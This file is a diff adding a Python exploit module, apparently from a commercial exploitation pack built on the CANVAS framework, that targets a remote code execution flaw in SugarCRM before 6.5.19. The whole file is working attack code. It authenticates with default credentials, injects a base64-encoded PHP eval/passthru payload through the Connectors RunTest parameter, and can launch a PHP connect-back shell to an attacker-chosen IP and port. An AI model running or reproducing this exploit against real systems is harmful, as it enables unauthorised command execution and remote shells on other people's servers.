@@ -1,0 +1,136 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+	
+from exploitutils import *
+from ExploitTypes.php_multi import *
+
+import canvasengine
+import time
+import urllib
+import libs.spkproxy as spkproxy #for urlopen
+
+# GUI info
+NAME = "SugarCRM Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in SugarCRM"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "SugarCRM"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2016.06.27"
+DOCUMENTATION["VersionsAffected"] = "SugarCRM < 6.5.19"
+DOCUMENTATION["References"] = "https://www.exploit-db.com/exploits/40027/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION="1.0"
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES="""
+Login and password must be set directly in the module.
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(php_multi):
+    def __init__(self):
+        php_multi.__init__(self)
+        self.port=80
+        self.host=""
+        self.ssl=""
+        self.name=NAME
+        self.basepath="/"
+        self.basepaths=["/"]
+        self.command=None 
+        self.basicauth_user=""
+        self.basicauth_password=""
+        self.hostname=None
+        self.foundstrings=["SugarCRM"]
+        self.testfile="index.php?action=Login&module=Users&login_module=Home&login_action=index"
+        return
+
+    def request1(self):
+        if self.command:
+            self.log("Command: %s"%self.command)
+            tag1   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            tag2   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            command=self.command
+            command="print("+tag1+");passthru('"+command+"');print("+tag2+");"
+            command="@eval(base64_decode(%s))"%b64encode(command).strip().strip("=")       
+
+            # Authentication
+            url = "index.php"  
+            params={}                
+            params["user_name"]= "admin"
+            params["user_password"]= "password"
+            params["module"]= "Users"
+            params["action"]= "Authenticate"                                                    
+            data = self.UA.POST(url, data=params)
+            if "Log In" in data:
+                self.log("Authentication error")
+                return 0
+
+            # Command exec                                    
+            url = "index.php?module=Connectors&action=RunTest&source_id=ext_rest_insideview&ext_rest_insideview_[\'.%s.\']=1"%(command)               
+            data = self.UA.GET(url)
+            if tag1 in data:
+                result=data.split(tag1)[1].split(tag2)[0]
+                self.log("Command response: %s"%prettyprint(result))
+                return 1
+        else:
+            command=self.get_php_to_mosdef()            
+            command="@eval(base64_decode(%s))"%b64encode(command).strip().strip("=")       
+
+            # Authentication
+            url = "index.php"
+            params={}                
+            params["user_name"]= "admin"
+            params["user_password"]= "password"
+            params["module"]= "Users"
+            params["action"]= "Authenticate"                                                    
+            data = self.UA.POST(url, data=params)
+            if "Log In" in data:
+                self.log("Authentication error")
+                return 0
+            
+            # Command exec                         
+            url = "index.php?module=Connectors&action=RunTest&source_id=ext_rest_insideview&ext_rest_insideview_[\'.%s.\']=1"%(command)
+            data = self.UA.GET(url)                                
+            self.log("[+] Looking for PHP connectback")
+
+
+    def usage(self):
+        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
+        print "-t <target ip>"
+        print "-p <target port>                [optional]"
+        print "-O basepath: /path/to/phplist/[optional]"
+        print "-O hostname: target vhost       [optional]"
+        print "-O command:commandtorun         [optional]"
+        print "-l call back ip if doing connect back"
+        print "-d listening port for call back"
+        return
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
